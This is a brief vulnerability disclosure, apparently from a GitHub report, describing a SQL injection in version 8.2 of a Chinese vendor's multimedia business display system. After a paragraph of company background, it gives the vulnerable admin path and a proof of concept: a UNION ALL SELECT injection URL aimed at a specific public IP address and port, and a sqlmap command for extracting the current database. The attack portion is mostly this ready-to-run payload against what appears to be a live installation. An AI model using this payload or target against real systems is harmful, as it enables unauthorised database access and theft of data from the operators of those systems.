Beijing Shenzhou Shihan Technology Co., Ltd. was established in 2010 with a registered capital of 50 million yuan. Its headquarters is located in the core area of Haidian, Beijing. It is a high-tech enterprise in Beijing and a demonstration enterprise for independent innovation in Zhongguancun. It has 41 patents, including national invention patents, 131 software copyrights, and has passed various qualification certifications such as ISO 09001 and ISO 14001. Shenzhou Shihan has been deeply involved in the field of information visualization for many years. The company has carefully laid out in multiple fields such as smart healthcare, smart government, smart education, and smart multimedia, providing multimedia digital services to major hospitals, government service centers, campuses, government enterprises, and shopping malls in China. Its application products are currently among the top brands.
There is a front-end SQL injection vulnerability in the multimedia integrated business display system of Beijing Shenzhou Shihan Technology Co., Ltd., which allows attackers to obtain sensitive information.

official：http://www.china-shine.com.cn/

version:8.2

 Vulnerability Path  ：/admin/system/structure/getdirectorydata/web/baseinfo/companyManage

See the login page.

poc：
http://114.242.229.140:32769/admin/system/structure/getdirectorydata/web/baseinfo/companyManage?Structure_ID=0' UNION ALL SELECT NULL,NULL,CONCAT(0x717a786271,0x5663654b7044747a657a496e566d7a7949596f75774561784571467174494a5257744b58446a4d53,0x71716b7071),NULL,NULL-- -
sqlmap -r /Users/yuelingfeng/.knife/114.242.229.140.0709-023638.req --risk=3 --level=3 --dbms=mysql --current-db



http://114.242.229.140:32769/

<img width="1464" height="173" alt="image" src="https://github.com/user-attachments/assets/80ef3a12-453e-4f7c-bf81-762921011ea8" />
